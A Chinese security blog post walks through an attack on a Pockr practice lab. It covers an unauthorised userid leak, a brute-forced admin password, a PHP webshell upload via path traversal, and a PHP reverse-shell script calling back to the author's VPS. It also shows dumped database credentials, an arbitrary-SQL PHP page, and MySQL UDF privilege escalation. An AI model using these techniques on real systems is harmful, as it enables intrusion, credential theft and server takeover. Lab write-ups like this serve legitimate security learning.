<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">

    

    <title>
      Pockr 未授权访问引发的血案 | HeartSky&#39;s blog 
    </title>

    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    
      <meta name="author" content="HeartSky">
    
    

    <meta name="description" content="靶场来源: https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc 未授权访问打开网站后只有登录和找回密码的功能其中找回密码处随意输入一个邮箱都会返回 {&amp;quot;message&amp;quot;:&amp;quot;false&amp;quot;}，这时注意到页面下方的技术支持邮箱，输入了下发现返回了一些重要信息1">
<meta name="keywords" content="渗透">
<meta property="og:type" content="article">
<meta property="og:title" content="Pockr 未授权访问引发的血案 | HeartSky&#39;s blog">
<meta property="og:url" content="http://heartsky.info/2018/03/26/Pockr-未授权访问引发的血案/index.html">
<meta property="og:site_name" content="HeartSky&#39;s blog">
<meta property="og:description" content="靶场来源: https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc 未授权访问打开网站后只有登录和找回密码的功能其中找回密码处随意输入一个邮箱都会返回 {&amp;quot;message&amp;quot;:&amp;quot;false&amp;quot;}，这时注意到页面下方的技术支持邮箱，输入了下发现返回了一些重要信息1">
<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323233934_lxopKB_Screenshot.jpeg">
<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323234624_JkhDor_Screenshot.jpeg">
<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323235034_AP3HhY_Screenshot.jpeg">
<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323235551_Ic2whg_Screenshot.jpeg">
<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180324000700_pun5yJ_Screenshot.jpeg">
<meta property="og:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180324002442_WxSr8J_Screenshot.jpeg">
<meta property="og:updated_time" content="2018-03-26T15:52:04.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Pockr 未授权访问引发的血案 | HeartSky&#39;s blog">
<meta name="twitter:description" content="靶场来源: https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc 未授权访问打开网站后只有登录和找回密码的功能其中找回密码处随意输入一个邮箱都会返回 {&amp;quot;message&amp;quot;:&amp;quot;false&amp;quot;}，这时注意到页面下方的技术支持邮箱，输入了下发现返回了一些重要信息1">
<meta name="twitter:image" content="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323233934_lxopKB_Screenshot.jpeg">
    
    
    
      <link rel="icon" type="image/x-icon" href="/favicon.png">
    
    <link rel="stylesheet" href="/css/uno.css">
    <link rel="stylesheet" href="/css/highlight.css">
    <link rel="stylesheet" href="/css/archive.css">
    <link rel="stylesheet" href="/css/china-social-icon.css">

</head>
<body>

    <span class="mobile btn-mobile-menu">
        <i class="icon icon-list btn-mobile-menu__icon"></i>
        <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
    </span>

    

<header class="panel-cover panel-cover--collapsed">


  <div class="panel-main">

  
    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">

        

        <h1 class="panel-cover__title panel-title"><a href="/" title="link to homepage">HeartSky&#39;s blog</a></h1>
        <hr class="panel-cover__divider" />

        
        <p class="panel-cover__description">
          在渗透之路上渐行渐远
        </p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        

        <div class="navigation-wrapper">

          <nav class="cover-navigation cover-navigation--primary">
            <ul class="navigation">

              
                
                <li class="navigation__item"><a href="/#blog" title="" class="blog-button">首页</a></li>
              
                
                <li class="navigation__item"><a href="/about" title="" class="">关于</a></li>
              
                
                <li class="navigation__item"><a href="/archive" title="" class="">归档</a></li>
              
                
                <li class="navigation__item"><a href="/friends" title="" class="">友链</a></li>
              

            </ul>
          </nav>

          <!-- ----------------------------
To add a new social icon simply duplicate one of the list items from below
and change the class in the <i> tag to match the desired social network
and then add your link to the <a>. Here is a full list of social network
classes that you can use:

    icon-social-500px
    icon-social-behance
    icon-social-delicious
    icon-social-designer-news
    icon-social-deviant-art
    icon-social-digg
    icon-social-dribbble
    icon-social-facebook
    icon-social-flickr
    icon-social-forrst
    icon-social-foursquare
    icon-social-github
    icon-social-google-plus
    icon-social-hi5
    icon-social-instagram
    icon-social-lastfm
    icon-social-linkedin
    icon-social-medium
    icon-social-myspace
    icon-social-path
    icon-social-pinterest
    icon-social-rdio
    icon-social-reddit
    icon-social-skype
    icon-social-spotify
    icon-social-stack-overflow
    icon-social-steam
    icon-social-stumbleupon
    icon-social-treehouse
    icon-social-tumblr
    icon-social-twitter
    icon-social-vimeo
    icon-social-xbox
    icon-social-yelp
    icon-social-youtube
    icon-social-zerply
    icon-mail

-------------------------------->

<!-- add social info here -->



        </div>

      </div>

    </div>

    <div class="panel-cover--overlay"></div>
  </div>
</header>

    <div class="content-wrapper">
        <div class="content-wrapper__inner entry">
            

<article class="post-container post-container--single">

  <header class="post-header">
    
    <h1 class="post-title">Pockr 未授权访问引发的血案</h1>

    

    <div class="post-meta">
      <time datetime="2018-03-26" class="post-meta__date date">2018-03-26</time> 

      <span class="post-meta__tags tags">

          

          
             &#8226; 标签:
            <font class="tags">
              <a class="tags-link" href="/tags/渗透/">渗透</a>
            </font>
          

      </span>
    </div>
    
    

  </header>

  <section id="post-content" class="article-content post">
    <p>靶场来源: <a href="https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc" target="_blank" rel="external">https://pockr.org/bug-environment/detail?environment_no=env_a20a1282feaae3fcbc</a></p>
<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>打开网站后只有登录和找回密码的功能<br>其中找回密码处随意输入一个邮箱都会返回 <code>{&quot;message&quot;:&quot;false&quot;}</code>，这时注意到页面下方的技术支持邮箱，输入了下发现返回了一些重要信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;message&quot;:&quot;true&quot;,&quot;email&quot;:&quot;admin@pockr.com&quot;,&quot;userid&quot;:&quot;BB568A04-8159-964E-CE49-D68AC10F8101&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p>此时我们已经得到了 userid 信息，暂时不知道什么用，翻下源码，注意到有一个 <code>sea-config.js</code>，包含了两个重要的 js 文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">login.js</span><br><span class="line">api.js</span><br></pre></td></tr></table></figure></p>
<p>login.js 定义了找回密码时对邮箱的验证以及向后台发送请求，api.js 定义了一个在前端没有出现的功能，会向 <code>User_Pockr_Api/UserInfo</code> POST 一个 <code>userid=xxx</code> 的请求，这时联想到之前我们得到的 userid，直接构造一个请求，比较蛋疼的是 burp 的一个显示 bug，多 POST 了一行数据导致一直是格式错误，以为还有一层加密结果也没找到。最后就没做了，等过了几天发现有一个微信群，问了下出题人一块探讨了下才发现了这个意料之外的问题(表示心塞</p>
<p>输入正确的 userid 得到用户名<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323233934_lxopKB_Screenshot.jpeg" alt=""></p>
<p>但是没有密码，尝试了下简单的弱口令不行，于是直接上了 top 1000 常用密码字典，得到密码为 <code>1q2w3e</code>，成功登录</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>后台只有两个搜索功能和一个文件上传功能，测试了下搜索功能并没有用，再去试下文件上传功能</p>
<p>随便上传一个会得到这样的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; php</span><br><span class="line">    [1] =&gt; </span><br><span class="line">    [2] =&gt; jpeg</span><br><span class="line">    [3] =&gt; gif</span><br><span class="line">    [4] =&gt; jpg</span><br><span class="line">    [5] =&gt; png</span><br><span class="line">)</span><br><span class="line">&lt;p&gt;The filetype you are attempting to upload is not allowed.&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
<p>应该是后缀的白名单，不过 php 在这里瞬间感觉有戏<br>直接上传了一个一句话，并且得到了路径<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323234624_JkhDor_Screenshot.jpeg" alt=""><br>但是返回的路径只有子文件夹和文件名，加上我们的一层文件夹，试了半天没找到文件在哪个目录下。最后发现是存在目录穿越漏洞的，通过更改 <code>subSysFolder</code>，可以让它上传到网站根目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryYfProJjo3FeUv8V1</span><br><span class="line">Content-Disposition: form-data; name=&quot;subSysFolder&quot;</span><br><span class="line"></span><br><span class="line">../../../../../../../var/www/html/www</span><br></pre></td></tr></table></figure></p>
<p>web 根目录通过一个 php 报错发现<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323235034_AP3HhY_Screenshot.jpeg" alt=""></p>
<h3 id="反弹-shell"><a href="#反弹-shell" class="headerlink" title="反弹 shell"></a>反弹 shell</h3><p>这里我电脑没下菜刀、蚁剑之类的工具，就直接反弹 shell 到我 vps 上了<br>用上 p 神的利用 php webshell 来反弹 shell 的脚本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ip = <span class="string">'xxx'</span>;</span><br><span class="line">$port = xxx;</span><br><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure></p>
<p>文章地址: <a href="https://www.leavesongs.com/PHP/backshell-via-php.html" target="_blank" rel="external">https://www.leavesongs.com/PHP/backshell-via-php.html</a></p>
<p>成功反弹<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180323235551_Ic2whg_Screenshot.jpeg" alt=""></p>
<p>因为目标是要获取数据库服务器权限，我们先去读取数据库配置文件。CI 的默认配置文件在 <code>application/config/database.php</code></p>
<p>得到 mysql 用户的用户名密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$db[&apos;default&apos;] = array(</span><br><span class="line">	&apos;dsn&apos;	=&gt; &apos;mysql:host=sql05.ciadmin.com;port=3306;dbname=five_admindb&apos;,</span><br><span class="line">	&apos;username&apos; =&gt; &apos;ciadmin&apos;,</span><br><span class="line">	&apos;password&apos; =&gt; &apos;mysql_2018&apos;,</span><br><span class="line">	&apos;dbdriver&apos; =&gt; &apos;pdo&apos;,</span><br><span class="line">	&apos;dbprefix&apos; =&gt; &apos;&apos;,</span><br><span class="line">	&apos;pconnect&apos; =&gt; FALSE,</span><br><span class="line">	&apos;db_debug&apos; =&gt; (ENVIRONMENT !== &apos;production&apos;),</span><br><span class="line">	&apos;cache_on&apos; =&gt; FALSE,</span><br><span class="line">	&apos;cachedir&apos; =&gt; &apos;&apos;,</span><br><span class="line">	&apos;char_set&apos; =&gt; &apos;utf8&apos;,</span><br><span class="line">	&apos;dbcollat&apos; =&gt; &apos;utf8_general_ci&apos;,</span><br><span class="line">	&apos;swap_pre&apos; =&gt; &apos;&apos;,</span><br><span class="line">	&apos;encrypt&apos; =&gt; FALSE,</span><br><span class="line">	&apos;compress&apos; =&gt; FALSE,</span><br><span class="line">	&apos;stricton&apos; =&gt; FALSE,</span><br><span class="line">	&apos;failover&apos; =&gt; array(),</span><br><span class="line">	&apos;save_queries&apos; =&gt; TRUE</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>在尝试连接 mysql 时，发现没有 mysql 这个命令，这个时候大概猜到了网站和数据库不是同一台服务器，<code>cat /etc/hosts</code> 看下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">172.18.0.2	bug05.ciadmin.com bug05</span><br></pre></td></tr></table></figure></p>
<p>不能直接用命令连接 mysql，但是我们可以在 php 中去连接，直接从根目录下 copy 了一个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$mysql_server_name=&apos;sql05.ciadmin.com&apos;;</span><br><span class="line">	$mysql_username=&apos;ciadmin&apos;;</span><br><span class="line">	$mysql_password=&apos;mysql_2018&apos;;</span><br><span class="line">	$mysql_database=&apos;five_admindb&apos;;</span><br><span class="line">	$mysqli = mysqli_connect($mysql_server_name,$mysql_username,$mysql_password,$mysql_database);</span><br><span class="line">	if (mysqli_connect_error()) &#123;</span><br><span class="line">		die(&apos;Connect Database Error&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	$sql = $_GET[&apos;sql&apos;];</span><br><span class="line">	$q = mysqli_query($mysqli,$sql);</span><br><span class="line">	var_dump($q-&gt;fetch_array());</span><br><span class="line">	mysqli_close($mysqli);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>成功执行 mysql 语句<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180324000700_pun5yJ_Screenshot.jpeg" alt=""></p>
<h3 id="mysql-udf-提权"><a href="#mysql-udf-提权" class="headerlink" title="mysql udf 提权"></a>mysql udf 提权</h3><p>谷歌了下，思路比较明确，通过 udf(user defined function)加载函数并执行命令<br>寻找插件库路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%plugin_dir%&quot;;</span><br></pre></td></tr></table></figure></p>
<p>是 Linux 下的默认目录 <code>/usr/lib/mysql/plugin/</code><br>因为已经有人写入 mysqludf.so 文件了，直接读取写入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/usr/lib/mysql/plugin/mysqludf.so&apos;) into dumpfile &apos;/usr/lib/mysql/plugin/heartsky.so</span><br></pre></td></tr></table></figure></p>
<p>但是一直没写入成功，本地试了下，猜测可能是 mysql 权限不足的问题， 于是尝试把用户名改成 root，密码不变再去连接，结果证明 root 用户的密码也是这个<br>加载函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create function sys_eval returns string soname &quot;heartsky.so&quot;;</span><br></pre></td></tr></table></figure></p>
<p>成功执行命令，获取到了数据库服务器的权限<br><img src="http://7xqn7l.com1.z0.glb.clouddn.com/pockr_weishouqun/20180324002442_WxSr8J_Screenshot.jpeg" alt=""></p>

  </section>

  
  
</article>


            <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
<footer class="footer">
    <span id="busuanzi_container_page_pv">
      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
    </span>
<span id="busuanzi_container_site_uv">
  本站访客数<span id="busuanzi_value_site_uv"></span>人次
</span>
    <span class="footer__copyright">&copy; 2016-2017. | 由<a href="https://hexo.io/">Hexo</a>强力驱动 | 主题<a href="https://github.com/someus/huno">Huno</a> | <a href="https://coding.net/u/HeartSky/p/HeartSky/git/pages">Hosted by Coding Pages</a></span>  
</footer>

        </div>
    </div>

    <!-- js files -->
    <script src="/js/jquery.min.js"></script>
    <script src="/js/main.js"></script>
    <script src="/js/scale.fix.js"></script>
    

    

    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript"> 
        $(document).ready(function(){
            MathJax.Hub.Config({ 
                tex2jax: {inlineMath: [['$','$'],['[latex]','[/latex]'], ['\\(','\\)']]} 
            });
        });
    </script>



    

    <script src="/js/awesome-toc.min.js"></script>
    <script>
        $(document).ready(function(){
            $.awesome_toc({
                overlay: true,
                contentId: "post-content",
            });
        });
    </script>


    <script src="http://s11.cnzz.com/z_stat.php?id=1259147269&web_id=1259147269" language="JavaScript"></script>
    
    <!--kill ie6 -->
<!--[if IE 6]>
  <script src="//letskillie6.googlecode.com/svn/trunk/2/zh_CN.js"></script>
<![endif]-->

</body>
</html>
